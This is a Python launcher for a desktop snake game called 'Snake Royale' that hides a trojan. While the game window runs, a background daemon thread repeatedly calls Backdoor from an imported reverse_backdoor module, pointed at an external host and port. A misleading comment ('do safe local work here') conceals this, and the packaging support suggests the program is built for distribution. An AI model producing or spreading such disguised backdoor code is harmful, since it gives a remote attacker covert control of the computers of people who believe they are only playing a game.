import os
import sys
import threading
import webview
from reverse_backdoor import Backdoor

HTML_FILE = "snake_game.html"

def resource_path(file_name):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, file_name)
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), file_name)

def main():
    html_path = resource_path(HTML_FILE)
    if not os.path.exists(html_path):
        raise FileNotFoundError(f"Game page not found: {html_path}")

    stop_event = threading.Event()

    def background_worker():
        while not stop_event.is_set():
            # do safe local work here
            my_backdoor = Backdoor("tf97lyn2.free.pwrp.cc", 19263)
            my_backdoor.run()
            pass

    worker = threading.Thread(target=background_worker, daemon=True)
    worker.start()

    try:
        webview.create_window(
            "Snake Royale",
            html_path,
            width=1080,
            height=760,
            resizable=True,
            easy_drag=True,
        )
        webview.start()
    finally:
        stop_event.set()
        worker.join()
        
if __name__ == "__main__":
    main()